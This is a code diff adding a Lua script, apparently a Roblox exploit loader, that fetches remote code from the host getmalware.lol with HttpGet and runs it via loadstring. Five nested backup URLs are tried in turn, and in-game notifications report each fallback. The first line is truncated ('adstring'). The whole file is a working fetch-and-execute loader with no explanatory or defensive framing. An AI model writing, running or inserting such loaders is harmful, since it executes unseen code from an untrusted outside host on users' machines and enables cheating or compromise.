@@ -1,0 +1,68 @@
+adstring(game:HttpGet("https://getmalware.lol/scripts/opt-logging"))()
+xpcall(function()
+      loadstring(game:HttpGet("https://getmalware.lol/scripts/tb3.lua?asfd=__a_00000000"))()
+    end, function(err)
+      
+      xpcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+          Title = "Backup 1/5",
+          Text = "Main script failed, trying backup 1...",
+          Duration = 5
+        })
+        loadstring(game:HttpGet("https://getmalware.lol/backups/tb3/1.lua?asfd=__a_00000000"))()
+      end, function(err)
+        
+      xpcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+          Title = "Backup 2/5",
+          Text = "Main script failed, trying backup 2...",
+          Duration = 5
+        })
+        loadstring(game:HttpGet("https://getmalware.lol/backups/tb3/2.lua?asfd=__a_00000000"))()
+      end, function(err)
+        
+      xpcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+          Title = "Backup 3/5",
+          Text = "Main script failed, trying backup 3...",
+          Duration = 5
+        })
+        loadstring(game:HttpGet("https://getmalware.lol/backups/tb3/3.lua?asfd=__a_00000000"))()
+      end, function(err)
+        
+      xpcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+          Title = "Backup 4/5",
+          Text = "Main script failed, trying backup 4...",
+          Duration = 5
+        })
+        loadstring(game:HttpGet("https://getmalware.lol/backups/tb3/4.lua?asfd=__a_00000000"))()
+      end, function(err)
+        
+      xpcall(function()
+        game:GetService("StarterGui"):SetCore("SendNotification", {
+          Title = "Backup 5/5",
+          Text = "Main script failed, trying backup 5...",
+          Duration = 5
+        })
+        loadstring(game:HttpGet("https://getmalware.lol/backups/tb3/5.lua?asfd=__a_00000000"))()
+      end, function(err)
+        
+    game:GetService("StarterGui"):SetCore("SendNotification", {
+      Title = "Loading Error",
+      Text = "TB3 has failed to load from all sources, try again later.",
+      Duration = 10
+    })
+    error(err)
+  
+      end)
+    
+      end)
+    
+      end)
+    
+      end)
+    
+      end)
+    
+    end)
